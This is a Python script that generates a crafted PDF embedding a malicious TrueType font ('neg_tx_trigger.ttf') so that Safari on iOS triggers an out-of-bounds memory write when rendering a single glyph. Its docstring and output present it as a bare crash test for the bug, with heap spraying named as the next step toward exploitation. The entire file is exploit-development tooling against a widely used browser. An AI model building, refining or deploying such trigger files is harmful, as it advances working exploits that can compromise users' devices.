#!/usr/bin/env python3
"""Bare trigger PDF — trigger glyph ONLY, no spray.

If the OOB write fires with no spray to absorb it, it should hit
unmapped memory or a guard page and crash Safari. This is the
definitive test for whether the bug fires on iOS.

No crash = bug doesn't fire on this iOS version/device.
Crash = bug fires, and we need to refine the spray strategy.
"""
import sys
import zlib

FONT = sys.argv[2] if len(sys.argv) > 2 else "neg_tx_trigger.ttf"
PTSIZE = 1024

def build(dst):
    ttf = open(FONT, "rb").read()
    ttf_z = zlib.compress(ttf)

    # Just render the trigger glyph, nothing else
    content = f"BT /F1 {PTSIZE} Tf 100 400 Td (A) Tj ET\n".encode()

    objs = [
        b"<< /Type /Catalog /Pages 2 0 R >>",
        b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
        b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 800 800] "
        b"/Resources << /Font << /F1 5 0 R >> >> /Contents 4 0 R >>",
        b"<< /Length %d >>\nstream\n" % len(content) + content + b"endstream",
        b"<< /Type /Font /Subtype /TrueType /BaseFont /CVEFont "
        b"/FirstChar 65 /LastChar 65 /Widths [100] "
        b"/Encoding /WinAnsiEncoding /FontDescriptor 6 0 R >>",
        b"<< /Type /FontDescriptor /FontName /CVEFont /Flags 4 "
        b"/FontBBox [0 0 2 40] /ItalicAngle 0 /Ascent 100 /Descent -100 "
        b"/CapHeight 100 /StemV 80 /FontFile2 7 0 R >>",
        b"<< /Length %d /Length1 %d /Filter /FlateDecode >>\nstream\n"
        % (len(ttf_z), len(ttf)) + ttf_z + b"\nendstream",
    ]

    out = bytearray(b"%PDF-1.5\n%\xe2\xe3\xcf\xd3\n")
    off = []
    for i, body in enumerate(objs, 1):
        off.append(len(out))
        out += b"%d 0 obj\n" % i + body + b"\nendobj\n"
    xref = len(out)
    out += b"xref\n0 %d\n0000000000 65535 f \n" % (len(objs) + 1)
    for o in off:
        out += b"%010d 00000 n \n" % o
    out += (b"trailer\n<< /Size %d /Root 1 0 R >>\nstartxref\n%d\n%%%%EOF\n"
            % (len(objs) + 1, xref))

    open(dst, "wb").write(out)
    print(f"wrote {dst} ({len(out):,} bytes)")
    print(f"  BARE TRIGGER: glyph only, no spray")
    print(f"  If crash => OOB fires, need better spray")
    print(f"  If no crash => OOB doesn't fire on this device")


if __name__ == "__main__":
    build(sys.argv[1] if len(sys.argv) > 1 else "bare_trigger.pdf")
